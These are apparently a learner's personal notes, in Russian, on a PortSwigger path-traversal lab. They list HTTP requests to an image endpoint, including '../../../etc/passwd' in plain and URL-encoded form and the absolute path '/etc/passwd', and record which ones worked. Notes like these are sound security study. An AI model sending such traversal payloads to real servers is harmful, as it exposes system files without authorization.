https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass


оригинал GET /image?filename=31.jpg       ответ 200
 
 GET /image?filename=/31.jpg                          ответ 200
 значит не блокирует слэш


не знаю, в чем смысл - 
GET /image?filename=../../../etc/passwd
но этот обычный путь сработал

../../../etc/passwd  в url кодировке тоже сработал (неудивительно)

%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64          ../../../etc/passwd  в url кодировке!

лаба решилась также как и предыдущая.

подсмотрел потом решение
в офциц решении GET /image?filename=/etc/passwd 
но в самой лабе GET /image?filename=/etc/passwd  не работает.
работает обычная директория ../../../etc/passwd

а по описанию смысл в том, что бывает такое что файл может лежать в этой же директории  что и текущий запрос.




